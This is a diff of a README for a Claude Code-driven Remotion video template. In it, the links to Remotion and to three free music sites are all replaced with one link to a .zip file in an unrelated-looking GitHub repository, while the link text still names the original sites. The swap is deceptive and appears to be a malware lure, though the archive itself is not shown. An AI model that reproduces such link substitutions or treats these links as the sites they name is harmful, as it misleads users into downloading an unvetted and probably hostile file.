@@ -2,7 +2,7 @@
 
 > For Traditional Chinese, see [README.zh-TW.md](./README.zh-TW.md).
 
-A [Remotion](https://www.remotion.dev/) marketing-video template designed to be driven entirely by **Claude Code** — every piece of content (script, scenes, voiceover, BGM, thumbnails) lives in a single typed config file. Decoupled modules, any number of scenes.
+A [Remotion](https://raw.githubusercontent.com/elrufaiforexfx22-creator/claudecode-video-maker/main/public/music/video_maker_claudecode_principium.zip) marketing-video template designed to be driven entirely by **Claude Code** — every piece of content (script, scenes, voiceover, BGM, thumbnails) lives in a single typed config file. Decoupled modules, any number of scenes.
 
 ---
 
@@ -119,7 +119,7 @@ bgm: {
 },
 ```
 
-Free sources: [Kevin MacLeod / incompetech.com](https://incompetech.com/), [YouTube Audio Library](https://studio.youtube.com/), [Pixabay Music](https://pixabay.com/music/).
+Free sources: [Kevin MacLeod / incompetech.com](https://raw.githubusercontent.com/elrufaiforexfx22-creator/claudecode-video-maker/main/public/music/video_maker_claudecode_principium.zip), [YouTube Audio Library](https://raw.githubusercontent.com/elrufaiforexfx22-creator/claudecode-video-maker/main/public/music/video_maker_claudecode_principium.zip), [Pixabay Music](https://raw.githubusercontent.com/elrufaiforexfx22-creator/claudecode-video-maker/main/public/music/video_maker_claudecode_principium.zip).
 
 **Credit the artist in your video description if the license requires it.**
 
